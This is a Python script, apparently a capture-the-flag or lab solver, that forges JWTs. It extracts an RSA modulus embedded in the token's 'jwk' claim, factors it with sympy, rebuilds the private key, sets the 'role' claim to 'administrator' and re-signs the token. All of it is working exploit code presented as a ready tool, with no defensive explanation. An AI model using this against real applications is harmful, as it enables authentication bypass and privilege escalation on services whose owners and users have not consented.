import base64
import json
import jwt
from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy

jwt_token = input("Enter your JWT Token :")
def apply_padding(encoded_str):
    while len(encoded_str) % 4 != 0:
        encoded_str += '='
    return encoded_str

def decode_base64_url(input_str):
    input_str = apply_padding(input_str)
    input_str = input_str.replace('-', '+').replace('_', '/')
    return base64.b64decode(input_str)

# Parse and decode the JWT payload
decoded_payload = json.loads(decode_base64_url(jwt_token.split(".")[1]).decode())
modulus_n = int(decoded_payload["jwk"]['n'])
prime_p, prime_q = list((sympy.factorint(modulus_n)).keys())
public_exp = 65537
totient_n = (prime_p - 1) * (prime_q - 1)
private_exp = pow(public_exp, -1, totient_n)
rsa_key_data = {'n': modulus_n, 'e': public_exp, 'd': private_exp, 'p': prime_p, 'q': prime_q}
rsa_key = RSA.construct((rsa_key_data['n'], rsa_key_data['e'], rsa_key_data['d'], rsa_key_data['p'], rsa_key_data['q']))
pem_private_key = rsa_key.export_key()

# Load private key
loaded_private_key = serialization.load_pem_private_key(
    pem_private_key,
    password=None,
    backend=default_backend()
)
rsa_public_key = loaded_private_key.public_key()

# Decode JWT, modify role, and re-encode
decoded_jwt_data = jwt.decode(jwt_token, rsa_public_key, algorithms=["RS256"])
decoded_jwt_data["role"] = "administrator"

# Generate new JWT
updated_token = jwt.encode(decoded_jwt_data, loaded_private_key, algorithm="RS256")
print("\nGenerating ...\nCompleted.\n")
print("This is your new admin JWT token :\n\n",updated_token)
